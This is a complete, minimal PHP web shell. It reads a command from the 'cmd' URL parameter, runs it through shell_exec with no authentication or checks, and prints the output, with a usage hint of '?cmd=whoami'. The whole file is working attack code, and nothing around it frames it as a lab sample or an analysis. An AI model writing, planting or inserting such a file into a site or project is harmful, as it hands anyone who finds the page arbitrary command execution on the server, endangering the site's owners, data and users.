<?php
header('Content-Type: text/plain');
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Executing: $cmd\n\n";
    $output = shell_exec($cmd);
    echo $output;
} else {
    echo "No command specified. Usage: ?cmd=whoami";
}
?>
